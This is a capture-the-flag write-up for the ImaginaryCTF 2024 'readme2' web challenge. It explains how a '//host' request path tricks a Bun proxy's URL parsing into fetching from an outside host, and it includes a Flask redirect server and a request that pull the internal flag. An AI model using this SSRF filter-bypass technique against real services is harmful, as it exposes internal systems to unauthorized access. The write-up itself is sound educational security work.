# readme2

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- Contributor: @colonneil, @obeidat.
- 56 solves / 249 points
- Author: @maple3142
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Try to read the `flag.txt` file, again!

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723131025.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723132007.png)

Hmm... It just respond us with `Hello, World!` in plaintext.

Let's take a look at this web application by reviewing its source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/Web/readme2/readme2.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/readme2)-[2024.07.23|13:21:19(HKT)]
└> file readme2.tar.gz 
readme2.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 10240
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/readme2)-[2024.07.23|13:21:21(HKT)]
└> tar xvzf readme2.tar.gz 
app.js
Dockerfile
```

Turns out, this web application is really simple. In `app.js`, it uses [Bun](https://bun.sh/) to serve 2 HTTP servers, where **port 3000 is internal** and **port 4000 is external**:

```javascript
const flag = process.env.FLAG || 'ictf{this_is_a_fake_flag}'

Bun.serve({
    async fetch(req) {
        const url = new URL(req.url)
        if (url.pathname === '/') return new Response('Hello, World!')
        if (url.pathname.startsWith('/flag.txt')) return new Response(flag)
        return new Response(`404 Not Found: ${url.pathname}`, { status: 404 })
    },
    port: 3000
})
Bun.serve({
    async fetch(req) {
        if (req.url.includes('flag')) return new Response('Nope', { status: 403 })
        const headerContainsFlag = [...req.headers.entries()].some(([k, v]) => k.includes('flag') || v.includes('flag'))
        if (headerContainsFlag) return new Response('Nope', { status: 403 })
        const url = new URL(req.url)
        if (url.href.includes('flag')) return new Response('Nope', { status: 403 })
        return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
            method: req.method,
            headers: req.headers,
            body: req.body
        })
    },
    port: 4000 // only this port are exposed to the public
})
```

Let's break it down!

First off, what's our goal? Where's the flag?

If we take a look at the **port 3000 internal web server**, if the request's **path name starts with `/flag.txt`**, it'll respond us with the flag!

```javascript
const flag = process.env.FLAG || 'ictf{this_is_a_fake_flag}'

Bun.serve({
    async fetch(req) {
        const url = new URL(req.url)
        if (url.pathname === '/') return new Response('Hello, World!')
        if (url.pathname.startsWith('/flag.txt')) return new Response(flag)
        return new Response(`404 Not Found: ${url.pathname}`, { status: 404 })
    },
    port: 3000
})
```

Since it's hosted internally, we can't directly reach to this internal server.

So, our goal is clear, somehow send a request with path name `/flag.txt` to the port 3000 internal server.

Hmm... What's that port 3000 external web server?

First, it **checks** whether if **the request's URL and headers contains the word `flag`** or not:

```javascript
Bun.serve({
    async fetch(req) {
        if (req.url.includes('flag')) return new Response('Nope', { status: 403 })
        const headerContainsFlag = [...req.headers.entries()].some(([k, v]) => k.includes('flag') || v.includes('flag'))
        if (headerContainsFlag) return new Response('Nope', { status: 403 })
        [...]
    },
    port: 4000 // only this port are exposed to the public
})
```

After that, it'll use **[JavaScript API `URL`](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL)** to parse the request's URL and **check the parsed URL contains the word `flag` again**:

```javascript
Bun.serve({
    async fetch(req) {
        [...]
        const url = new URL(req.url)
        if (url.href.includes('flag')) return new Response('Nope', { status: 403 })
        [...]
    },
    port: 4000 // only this port are exposed to the public
})
```

If every checks passed, it'll **send the parsed `URL` request to the port 3000 internal server**:

```javascript
Bun.serve({
    async fetch(req) {
        [...]
        return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
            method: req.method,
            headers: req.headers,
            body: req.body
        })
    },
    port: 4000 // only this port are exposed to the public
})
```

With that said, we'll need to somehow **bypass the external server's checks** in order to read the flag.

Since those servers were served via [Bun](https://bun.sh/), **maybe it has some weird request parsing**?

After I fuzzing it a little bit, I found some very weird errors, such as this:

**Request:**
```http
GET // HTTP/1.1
```

**Respond:**
```http
HTTP/1.1 500 Internal Server Error
```

Huh? This path (`//`) caused an error?

**If we host this challenge in a local environment, we'll see this error message:**
```shell
app-1  | 14 |       if (req.url.includes('flag')) return new Response('Nope', { status: 403 })
app-1  | 15 |       const headerContainsFlag = [...req.headers.entries()].some(([k, v]) => k.includes('flag') || v.includes('flag'))
app-1  | 16 |       if (headerContainsFlag) return new Response('Nope', { status: 403 })
app-1  | 17 |       const url = new URL(req.url)
app-1  | 18 |       if (url.href.includes('flag')) return new Response('Nope', { status: 403 })
app-1  | 19 |       return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
app-1  |                     ^
app-1  | TypeError: "//" cannot be parsed as a URL.
app-1  |       at /app/app.js:19:16
app-1  |       at fetch (/app/app.js:13:14)
app-1  | GET - // failed
```

Hmm... Looks like the `URL` has a parsing error.

Now, what if we **append something in the `//`**? Like the following request:

```http
GET //foobar HTTP/1.1
```

**Error message:**
```shell
app-1  | ConnectionRefused: Unable to connect. Is the computer able to access the url?
app-1  |  path: "http://foobar/"
app-1  | GET - http://localhost//foobar failed
```

Huh??? So, **somehow the `URL` parser treats `//<hostname_here>` as a URL**.

**If we read the [mdn web docs about API `URL`](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL#examples), we can see this invalid URL example:**
```javascript
new URL("//foo.com", "https://example.com");
// => 'https://foo.com/' (see relative URLs)
```

As you can see, in `new URL(url, base)`, if we input `//foo.com` in the `url`, it'll treat the input as a **relative URL**.

With that said, we can **abuse this "feature" to bypass the word `flag` filter**!

## Exploitation

With the above information, we can **host a web application that redirects a request to `http://localhost:3000/flag.txt`**!

> Note: The `localhost:3000` is because we want to redirect the `fetch` request to the internal web server.

To do so, we can write a simple Python Flask web application:

```python
#!/usr/bin/env python3
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirectRequest():
    return redirect('http://localhost:3000/flag.txt')

if __name__ == '__main__':
    app.run('0.0.0.0', port=8000, debug=True)
```

```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/readme2)-[2024.07.23|13:55:40(HKT)]
└> python3 solve.py
 * Serving Flask app 'solve'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://10.69.96.69:8000
[...]
```

Then, send the following request to the external web server:

```http
GET //10.69.96.69:8000/redirect HTTP/1.1
```

```shell
172.18.0.2 - - [23/Jul/2024 13:56:42] "GET /redirect HTTP/1.1" 302 -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240723135749.png)

- **Flag: `ictf{just_a_funny_bug_in_bun_http_handling}`**

## Conclusion

What we've learned:

1. Bypassing request URL filter via relative URL